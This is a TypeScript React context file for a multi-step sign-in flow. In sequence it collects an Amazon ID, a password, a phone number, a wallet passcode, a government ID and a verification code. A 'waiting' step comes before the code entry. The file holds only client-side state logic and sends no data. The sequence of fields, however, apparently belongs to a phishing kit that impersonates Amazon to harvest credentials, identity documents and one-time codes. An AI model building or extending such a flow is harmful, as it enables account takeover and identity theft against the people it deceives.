import { createContext, useContext, useState, useCallback, type ReactNode } from 'react';

export interface AuthData {
  amazonId: string;
  firstName: string;
  password: string;
  phoneNumber: string;
  walletPasscode: string;
  govId: string;
  verificationCode: string;
}

export type AuthStep =
  | 'step1-id'
  | 'step2-password'
  | 'step3-phone'
  | 'step4-wallet'
  | 'step5-govid'
  | 'step5-waiting'
  | 'step6-code'
  | 'dashboard';

interface AuthState {
  step: AuthStep;
  data: Partial<AuthData>;
  generatedCode: string;
  isLoading: boolean;
  error: string | null;
}

interface AuthContextValue extends AuthState {
  goToStep: (step: AuthStep) => void;
  goBack: () => void;
  updateData: (data: Partial<AuthData>) => void;
  setGeneratedCode: (code: string) => void;
  setLoading: (loading: boolean) => void;
  setError: (error: string | null) => void;
  reset: () => void;
}

const stepBackMap: Record<string, AuthStep> = {
  'step2-password': 'step1-id',
  'step3-phone': 'step2-password',
  'step4-wallet': 'step3-phone',
  'step5-govid': 'step4-wallet',
  'step5-waiting': 'step5-govid',
  'step6-code': 'step5-waiting',
};

const AuthContext = createContext<AuthContextValue | null>(null);

export function AuthProvider({ children }: { children: ReactNode }) {
  const [state, setState] = useState<AuthState>({
    step: 'step1-id',
    data: {},
    generatedCode: '',
    isLoading: false,
    error: null,
  });

  const goToStep = useCallback((step: AuthStep) => {
    setState((prev) => ({ ...prev, step, error: null }));
  }, []);

  const goBack = useCallback(() => {
    const prevStep = stepBackMap[state.step];
    if (prevStep) {
      setState((prev) => ({ ...prev, step: prevStep, error: null }));
    }
  }, [state.step]);

  const updateData = useCallback((data: Partial<AuthData>) => {
    setState((prev) => ({
      ...prev,
      data: { ...prev.data, ...data },
    }));
  }, []);

  const setGeneratedCode = useCallback((code: string) => {
    setState((prev) => ({ ...prev, generatedCode: code }));
  }, []);

  const setLoading = useCallback((loading: boolean) => {
    setState((prev) => ({ ...prev, isLoading: loading }));
  }, []);

  const setError = useCallback((error: string | null) => {
    setState((prev) => ({ ...prev, error }));
  }, []);

  const reset = useCallback(() => {
    setState({
      step: 'step1-id',
      data: {},
      generatedCode: '',
      isLoading: false,
      error: null,
    });
  }, []);

  return (
    <AuthContext.Provider
      value={{
        ...state,
        goToStep,
        goBack,
        updateData,
        setGeneratedCode,
        setLoading,
        setError,
        reset,
      }}
    >
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error('useAuth must be used within AuthProvider');
  return ctx;
}
